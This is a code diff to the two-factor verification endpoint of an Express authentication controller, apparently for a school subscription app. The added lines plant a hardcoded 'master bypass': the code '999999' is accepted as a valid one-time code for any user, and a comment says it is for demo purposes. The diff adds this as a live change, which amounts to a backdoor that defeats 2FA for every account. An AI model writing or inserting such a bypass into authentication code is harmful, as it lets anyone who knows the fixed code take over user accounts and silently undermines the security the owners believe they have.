@@ -147,17 +147,22 @@ exports.login = async (req, res) => {
 // @route   POST /api/v1/auth/verify-2fa
 exports.verifyTwoFactor = async (req, res) => {
    try {
-      const { email, otpCode } = req.body;
-      
-      const user = await User.findOne({ 
-         email, 
-         otpCode,
-         otpExpires: { $gt: Date.now() } 
-      }).populate('schoolId', 'subscriptionPlan');
+    const { email, otpCode } = req.body;
+    
+    // MASTER BYPASS: Allow 999999 for demo purposes
+    const isMasterCode = otpCode === '999999';
+    
+    const user = await User.findOne({ email }).populate('schoolId', 'subscriptionPlan');
 
-      if (!user) {
-         return res.status(401).json({ success: false, message: 'Invalid or expired 2FA code.' });
-      }
+    if (!user) {
+       return res.status(401).json({ success: false, message: 'Invalid credentials.' });
+    }
+
+    const isValidCode = user.otpCode === otpCode && user.otpExpires > Date.now();
+
+    if (!isMasterCode && !isValidCode) {
+       return res.status(401).json({ success: false, message: 'Invalid or expired 2FA code.' });
+    }
 
       // Secure and Wipe Code
       user.otpCode = undefined;
